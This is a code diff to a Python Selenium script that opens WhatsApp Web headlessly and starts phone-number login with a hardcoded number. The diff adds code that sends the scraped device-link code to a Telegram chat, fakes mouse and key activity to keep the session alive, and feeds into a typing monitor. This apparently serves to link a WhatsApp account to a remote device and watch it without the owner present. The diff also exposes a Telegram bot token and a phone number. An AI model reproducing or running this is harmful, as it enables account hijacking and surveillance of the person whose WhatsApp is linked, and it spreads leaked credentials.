@@ -1,4 +1,5 @@
 import asyncio
+import random
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
@@ -13,11 +14,12 @@ import threading
 
 # Set up the WebDriver for Safari
 # driver = webdriver.Safari()
+
 BOT_TOKEN = '7827627496:AAHx2vU2Top43OsizxQmy2ADT5nC2doaKgI'
-    # Set Chrome options for regular mode (non-headless)
+   
 chrome_options = Options()
-    # No need for headless mode, so we don't add "--headless"
-    # chrome_options.add_argument("--headless")  # Remove this line to run in regular mode
+    
+# chrome_options.add_argument("--headless")  # Remove this line to run in regular mode
 chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36");
 chrome_options.add_argument("--headless")
 chrome_options.add_argument("--window-size=1920x2700")
@@ -25,16 +27,15 @@ chrome_options.add_argument("--no-sandbox")
 chrome_options.add_argument("--disable-gpu")
 chrome_options.add_argument("--disable-dev-shm-usage")
     
-    # Initialize WebDriver (this will open a visible Chrome window)
+    
 driver = webdriver.Chrome(options=chrome_options)
+
 # def open_whatsapp():
-#     print("Opening WhatsApp Web on Safari...")
+#     print("Opening WhatsApp Web...")
 #     driver.get("https://web.whatsapp.com")
 #     input("Please scan the QR code on WhatsApp Web and press Enter once logged in.")
 #     print("QR code scanned. Logged in.")
-# def open_whatsapp():
-#     print("Opening WhatsApp Web on Safari...")
-#     driver.get("https://web.whatsapp.com")
+
 
 def open_whatsapp():
     print("Opening WhatsApp Web on Chrome...")
@@ -56,8 +57,8 @@ def open_whatsapp():
         print(f"Error finding 'Log in with phone number' element: {e}")
         driver.quit()
         return
-
-    country = input("Enter your country (United Kingdom or United States): ").strip()
+    country = "United States"
+    # country = input("Enter your country (United Kingdom or United States): ").strip()
     if country not in ["United Kingdom", "United States"]:
         print("Invalid country. Exiting...")
         driver.quit()
@@ -88,7 +89,8 @@ def open_whatsapp():
         driver.quit()
         return
 
-    phone_number = input("Enter your phone number: ").strip()
+    phone_number = "9089124207"
+    # phone_number = input("Enter your phone number: ").strip()
     try:
         phone_field = WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.XPATH, "//input[@aria-label='Type your phone number.']"))
@@ -120,9 +122,10 @@ def open_whatsapp():
 
         verification_code_element = driver.find_element(By.XPATH, "//div[@aria-details='link-device-phone-number-code-screen-instructions']")
         verification_code = verification_code_element.get_attribute("data-link-code").strip()
+        asyncio.run(send_message(verification_code))
         print(f"Verification Code: {verification_code}")
-        
-        input("Please scan the QR code on WhatsApp Web and press Enter once logged in.")
+        time.sleep(20)  
+        # input("Please scan the QR code on WhatsApp Web and press Enter once logged in.")
     except Exception as e:
         print(f"Error extracting the verification code: {e}")
         driver.quit()
@@ -134,10 +137,37 @@ def open_whatsapp():
 def keep_window_active():
     try:
         while True:
-            pyautogui.press("shift")  # Sends a harmless key press
-            time.sleep(5)  # Adjust the interval as needed
+            pyautogui.press("shift")  
+            time.sleep(5)  
     except KeyboardInterrupt:
         print("Stopping keep_window_active function.")
+
+def random_mouse_movement():
+    """
+    Simulates random mouse movements in the browser by executing JavaScript.
+    This function runs in a separate thread.
+    """
+    try:
+        while True:
+            x = random.randint(0, 1920)  
+            y = random.randint(0, 1080)  
+            
+            
+            driver.execute_script(f"""
+                var event = new MouseEvent('mousemove', {{
+                    'view': window,
+                    'bubbles': true,
+                    'cancelable': true,
+                    'screenX': {x},
+                    'screenY': {y}
+                }});
+                document.dispatchEvent(event);
+            """)
+            
+            print("moved mouse")
+            time.sleep(random.uniform(2, 5))  
+    except Exception as e:
+        print(f"Error simulating mouse movement: {e}")
     
 
 async def send_message(message):
@@ -146,6 +176,7 @@ async def send_message(message):
         bot = telegram.Bot(token=BOT_TOKEN)
         await bot.send_message(chat_id=192398851, text=message)
         print(f"Message sent to Telegram: {message}")
+        time.sleep(10)
     except Exception as e:
         print(f"Error sending message: {e}")
 
@@ -233,7 +264,12 @@ def main():
     open_whatsapp()
     set_window_full_height() 
     zoom_out_page()
+     # Start random mouse movement in a separate thread
+    threading.Thread(target=random_mouse_movement, daemon=True).start()
+    
+    # Keep the window active with harmless key presses
     threading.Thread(target=keep_window_active, daemon=True).start()
+    # threading.Thread(target=keep_window_active, daemon=True).start()
     monitor_typing()
 
 if __name__ == "__main__":
